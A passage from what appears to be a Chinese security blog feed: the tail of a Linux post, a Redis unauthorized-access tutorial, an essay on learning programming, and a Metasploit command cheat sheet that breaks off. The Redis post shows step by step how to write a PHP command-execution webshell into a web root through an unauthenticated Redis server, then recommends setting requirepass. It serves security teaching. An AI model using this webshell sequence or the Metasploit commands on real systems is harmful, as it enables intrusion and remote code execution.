&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x09.png&quot; alt=&quot;enter description here&quot; title=&quot;0x09&quot; /&gt;&lt;/p&gt;

&lt;p&gt;此时按下快捷键激活截图软件:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-3-18/0x10.png&quot; alt=&quot;enter description here&quot; title=&quot;0x10&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x03-参考&quot;&gt;0x03 参考&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;https://www.omgubuntu.co.uk/2011/12/how-to-add-actions-emblem-support-back-to-nautilus-in-ubuntu-11-10/&lt;/li&gt;
  &lt;li&gt;https://www.linuxidc.com/Linux/2014-04/100984.htm&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://lira.epac.to/DOCS/nautilus-actions/html/C/nact/nautilus-actions-config-tool.html#introduction&lt;/p&gt;

  &lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Sun, 18 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-18/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-18/1</guid>
        
        
        <category>Linux</category>
        
      </item>
    
      <item>
        <title>Redis未授权访问简介</title>
        <description>&lt;p&gt;本文介绍一下Redis未授权访问简介
&lt;!--more--&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。从2010年3月15日起，Redis的开发工作由VMware主持。从2013年5月开始，Redis的开发由Pivotal赞助。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set –有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;之前看SRC刷过Redis未授权访问的漏洞&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/3150364-323afe041674576d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;redis_0x1-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;那么下面我来揭开它的神秘面纱！&lt;/p&gt;

&lt;p&gt;首先我下载了安装包。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/3150364-3c97530c544d98e1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;redis_0x2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;[ — 安装过程 自行百度 –]&lt;/p&gt;

&lt;p&gt;安装好以后，我们启动redis服务：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/share/redis/bin/redis-server /etc/redis.conf
vim /etc/redis.conf
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;在181行左右 我先注释访问密码。&lt;/p&gt;

&lt;p&gt;然后启动redis-server&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@localhost 桌面]# ps -A | grep redis
 3931 ?        00:00:00 redis-server
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;首先我先用客户端连接服务器：&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@localhost 桌面]# redis-cli 
redis 127.0.0.1:6379&amp;gt; keys *
1) &quot;about&quot;
2) &quot;user:id1&quot;
3) &quot;user:id2&quot;
4) &quot;admin&quot;
5) &quot;str&quot;
redis 127.0.0.1:6379&amp;gt; get str
&quot;ldjskjdsahdsaa&quot;
redis 127.0.0.1:6379&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;可以看到能直接操作数据库。&lt;/p&gt;

&lt;p&gt;下面我用另外一台服务器做安全测试&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@localhost 桌面]# redis-cli -h 10.10.3.215
redis 10.10.3.215:6379&amp;gt; keys *
1) &quot;about&quot;
2) &quot;user:id1&quot;
3) &quot;user:id2&quot;
4) &quot;admin&quot;
5) &quot;str&quot;
redis 10.10.3.215:6379&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;发现也是可以直接操作数据库&lt;/p&gt;

&lt;p&gt;根据redis语句我们写webshell….&lt;/p&gt;

&lt;p&gt;前提是知道绝对路径，当然也可以用语句判断。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis 10.10.3.215:6379&amp;gt; CONFIG SET dir /var/wwwroot/
(error) ERR Changing directory: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;可以发现不存在，那么就可以猜解目录了。&lt;/p&gt;

&lt;p&gt;下面我演示写webshell&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis 10.10.3.215:6379&amp;gt; CONFIG SET dir /usr/share/apache/htdocs/ #这里是站点绝对路径
OK
redis 10.10.3.215:6379&amp;gt; set shell &quot;&amp;lt;?php echo system($_REQUEST[cmd])?&amp;gt;&quot;
OK
redis 10.10.3.215:6379&amp;gt; CONFIG SET dbfilename shell.php
OK
redis 10.10.3.215:6379&amp;gt; save  #将内存中的数据保存到dbfilename中
OK
redis 10.10.3.215:6379&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;这样就getshell了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://upload-images.jianshu.io/upload_images/3150364-78f6ce3f2a7e5357.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&quot; alt=&quot;redis_0x4.png&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;下面看看这个未授权原因
在刚才的配置文件中，有一个选项
设置客户端连接后进行任何其他指定前需要使用的密码。
警告：因为redis速度相当快，所以在一台比较好的服务器下，一个外部的用户可以在一秒钟进行150K次的密码尝试，这意味着你需要指定非常非常强大的密码来防止暴力破解
requirepass [密码]
所以必须设置密码。
出现这类漏洞就是 配置不得当导致控制系统 执行任意代码  再深入还可以威胁主从服务器 及其他的数据库服务器。&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        <pubDate>Fri, 16 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-16/4</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-16/4</guid>
        
        
        <category>Program</category>
        
      </item>
    
      <item>
        <title>信安从业人员的编程之路</title>
        <description>&lt;p&gt;本文简述一下自己学习编程的过程
&lt;!--more--&gt;&lt;/p&gt;

&lt;h2 id=&quot;0x00-前言&quot;&gt;0x00 前言&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;16年上半年准备做PHP程序猿，自己开发了一套框架+博客，可以当做是一个CMS吧，我并没有大量发布它，只是觉得功能太少，一个人维护不过来。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;16年下半年学习Python，分享、讲课，开发了不少鸡肋工具&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;17年下半年就开始学习C、C++，期间也有想过放弃，但是走到今天了，并不觉得后悔。&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;花费了大量时间在Coding上，没去研究安全。&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;一直以来我坚信编程能给我带来极大的好处，所以才坚持到现在。&lt;/p&gt;

&lt;p&gt;这门古老的计算机高级语言，锤炼了我的耐心，消磨了我的性子，让我知道什么时候我是最专注的，什么时候注意力用完了。&lt;/p&gt;

&lt;h2 id=&quot;0x01-注意力专注力&quot;&gt;0x01 注意力、专注力&lt;/h2&gt;

&lt;p&gt;在电脑面前对普通人是很枯燥的，除了爱玩游戏的发烧友。我学习编程这么久以来，我发现自己的注意力、专注力是有限的。就像一天有24小时，有几个小时你的大脑是空白的，身体是需要休息的。&lt;/p&gt;

&lt;p&gt;当为了学习而消费了我的注意力、专注力的时候，我会感觉一天都过得很充实。这一点我想大家也是感同身受过的。&lt;/p&gt;

&lt;h2 id=&quot;0x02-为什么要学习编程&quot;&gt;0x02 为什么要学习编程?&lt;/h2&gt;

&lt;p&gt;例如C语言属于计算机的高级语言，操作内存很方便，效率很高，而且和计算机网络的发展有莫大的关系。&lt;/p&gt;

&lt;p&gt;倘若我后期需要从Web安全转向二进制，会很方便。（自我感觉）&lt;/p&gt;

&lt;p&gt;很多标准、协议，都在Linux的一些头文件里，我们可以根据RFC文档去解读每一个协议对应的文件。&lt;/p&gt;

&lt;p&gt;在之前我写的DNS协议编程，就学到了很多。&lt;/p&gt;

&lt;h2 id=&quot;0x03-如何学习编程&quot;&gt;0x03 如何学习编程？&lt;/h2&gt;

&lt;p&gt;这个问题我拉出来讨论有点担惊受怕，毕竟我掌握这几门语言，只懂得基本的编程语法、网络协议编程、和使用一些开源库来给我添砖加瓦。&lt;/p&gt;

&lt;h3 id=&quot;学会创造需求&quot;&gt;学会创造需求&lt;/h3&gt;

&lt;p&gt;很多人学习语言的时候觉得特别枯燥，是因为感觉学习一个&lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt;并不能满足你想干的事，这时候就会感觉到烦躁，焦虑，惶恐不安，也就不会坚持下去了&lt;/p&gt;

&lt;p&gt;我说的“创造需求”中的“需求”可以是写一个计算器、判断大小数、循环输出100以内的质数、鸡兔同笼的解答程序等等……&lt;/p&gt;

&lt;p&gt;Web安全开发方向：&lt;/p&gt;

&lt;p&gt;当然也有野路子：直接实现一个子域名枚举、目录枚举、爬虫、字典生成 等等&lt;/p&gt;

&lt;p&gt;当这些需求映入眼帘的时候，你就已经确立了目标，创造了需求。哪怕这个需求对于其他人或自己没有什么意义，你也有必要去实现它。&lt;/p&gt;

&lt;p&gt;学习的过程中收获成就感是一个很好的方式，它可以让你持之以恒的热爱这门语言。&lt;/p&gt;

&lt;p&gt;（殊不知在未来你开发的日子里&lt;code class=&quot;highlighter-rouge&quot;&gt;if&lt;/code&gt;是用的最多的语法其中之一）&lt;/p&gt;

&lt;h3 id=&quot;学会分析需求&quot;&gt;学会分析需求&lt;/h3&gt;

&lt;p&gt;假设你已经有了一个小需求、或者是大需求，那么接下来不是直接去做，而是要思考、去查找。&lt;/p&gt;

&lt;p&gt;思考你的需求需要具备什么能力去实现，去查找这个需求需要满足什么条件才能够实现&lt;/p&gt;

&lt;p&gt;举个例子吧，一个&lt;code class=&quot;highlighter-rouge&quot;&gt;目录枚举&lt;/code&gt;的工具，我们可以使用很多语言来实现，假设你学习的是Python：&lt;/p&gt;

&lt;p&gt;那么实现目录枚举需要具备以下基本的能力：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;基本语法&lt;/li&gt;
  &lt;li&gt;基本熟悉一个HTTP库&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;条件：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;一台能够上网的电脑&lt;/li&gt;
  &lt;li&gt;有Python环境&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;实现需求&quot;&gt;实现需求&lt;/h3&gt;

&lt;p&gt;这个过程是兴奋的，因为你正在做这件事儿。&lt;/p&gt;

&lt;p&gt;中间肯定会磕磕碰碰遇到许多问题，但是Python有其优势，写这个功能并不需要多少行代码。&lt;/p&gt;

&lt;p&gt;但是我要给你泼冷水了，上面的能力写不出你满意的工具……&lt;/p&gt;

&lt;p&gt;因为效率还达不到！&lt;/p&gt;

&lt;p&gt;你还没有了解线程、进程的概念，还没有OOP这个思想&lt;/p&gt;

&lt;p&gt;所以，做好一个项目需要不断的完善它，优化它，这才是编程的意义~&lt;/p&gt;

&lt;p&gt;往往实现只是开始，当你的代码写的很乱的时候，肯定是你没有在一开始的时候思考够&lt;/p&gt;

&lt;h2 id=&quot;0x04-学习编程的捷径&quot;&gt;0x04 学习编程的捷径&lt;/h2&gt;

&lt;p&gt;没有捷径，老老实实写代码吧！&lt;/p&gt;

&lt;h2 id=&quot;0x05-长期的维护一个项目&quot;&gt;0x05 长期的维护一个项目&lt;/h2&gt;

&lt;p&gt;这个目前我还没有去做，也没有发布什么，只是写一写小工具，方便内网渗透、Web的信息搜集&lt;/p&gt;

&lt;p&gt;但是以我的理解，长期维护一个项目能让你的思想更加坚定，让开发成为习惯、乐趣&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;另外，目前我在开发一个前渗透框架，目前服务端已经架构好了，希望有人一起和我实现
它。&lt;/p&gt;

&lt;p&gt;服务端语言：C/C++&lt;/p&gt;

&lt;p&gt;需要其他语言及组件：MySQL PHP Linux Python&lt;/p&gt;

&lt;p&gt;它的功能：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;DNS枚举&lt;/li&gt;
  &lt;li&gt;端口扫描&lt;/li&gt;
  &lt;li&gt;以(IP/域名/开放端口/网页标题)生成Hash版本&lt;/li&gt;
  &lt;li&gt;定时巡检&lt;/li&gt;
  &lt;li&gt;数据可视化&lt;/li&gt;
  &lt;li&gt;用户认证&lt;/li&gt;
  &lt;li&gt;API接口&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;我的微信：Guest_Killer_0nlis&lt;/p&gt;

</description>
        <pubDate>Fri, 16 Mar 2018 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/archivers/2018-03-16/1</link>
        <guid isPermaLink="true">http://localhost:4000/archivers/2018-03-16/1</guid>
        
        
        <category>Program</category>
        
      </item>
    
      <item>
        <title>msfconsole常用命令</title>
        <description>&lt;p&gt;本文记录一下基础命令
&lt;!--more--&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令： show exploits&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出metasploit框架中的所有渗透攻击模块。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：show payloads&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出metasploit框架中的所有攻击载荷。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;命令：show auxiliary&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出metasploit框架中的所有辅助攻击载荷。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：search name&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;查找metasploit框架中所有的渗透攻击和其他模块。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：info&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;展示出制定渗透攻击或模块的相关信息。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：use name&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;装载一个渗透攻击或模块。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：LHOST&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;你本地可以让目标主机连接的IP地址，通常当目标主机不在同一个局域网内时，就需要是一个公共IP地址，特别为反弹式shell使用。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：RHOST&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;远程主机或是目标主机。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：set function&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;设置特定的配置参数（EG：设置本地或远程主机参数）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：setg function&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;以全局方式设置特定的配置参数（EG：设置本地或远程主机参数）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：show options&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出某个渗透攻击或模块中所有的配置参数。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：show targets&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出渗透攻击所有支持的目标平台。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：set target num&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;指定你所知道的目标的操作系统以及补丁版本类型。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：set payload name&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;指定想要使用的攻击载荷。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;blockquote&gt;
  &lt;p&gt;命令：show advanced&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出所有高级配置选项。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：set autorunscript migrate -f.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在渗透攻击完成后，将自动迁移到另一个进程。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：check&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;检测目标是否选定渗透攻击存在相应的安全漏洞。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：exploit&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;执行渗透攻击或模块来攻击目标。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：exploit -j&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在计划任务下进行渗透攻击（攻击将在后台进行）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：exploit -z&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;渗透攻击完成后不与回话进行交互。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：exploit -e encoder&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;制定使用的攻击载荷编码方式（EG：exploit -e shikata_ga_nai）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：exploit -h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出exploit命令的帮助信息。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：sessions -l&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出可用的交互会话（在处理多个shell时使用）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：sessions -l -v&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;列出所有可用的交互会话以及详细信息，EG：攻击系统时使用了哪个安全漏洞。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：sessions -s script&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在所有活跃的metasploit会话中运行一个特定的metasploit脚本。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：sessions -K&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;杀死所有活跃的交互会话。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：sessions -c cmd&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;在所有活跃的metasploit会话上执行一个命令。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：sessions -u sessionID&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;升级一个普通的win32 shell到metasploit shell。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_create name&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;创建一个数据库驱动攻击所要使用的数据库（EG：db_create autopwn）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_connect name&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;创建并连接一个数据库驱动攻击所要使用的数据库（EG：db_connect user:passwd@ip/sqlname）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_namp&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;利用nmap并把扫描数据存储到数据库中（支持普通的nmap语句，EG：-sT -v -P0）。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_autopwn -h&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;展示出db_autopwn命令的帮助信息。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_autopwn -p -r -e&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;对所有发现的开放端口执行db_autopwn，攻击所有系统，并使用一个反弹式shell。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_destroy&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;删除当前数据库。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;命令：db_destroy user：passwd@host：port/database&lt;/p&gt;
&lt;/blockquote&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;使用高级选项来删除数据库。
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;metasploit命令&quot;&gt;&lt;strong&gt;&lt;em&gt;metasploit命令&lt;/em&gt;&lt;/strong&gt;&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;help
打开meterpreter使用帮助。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;run scriptname
运行meterpreter脚本，在scripts/meterpreter目录下可查看到所有脚本名。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sysinfo
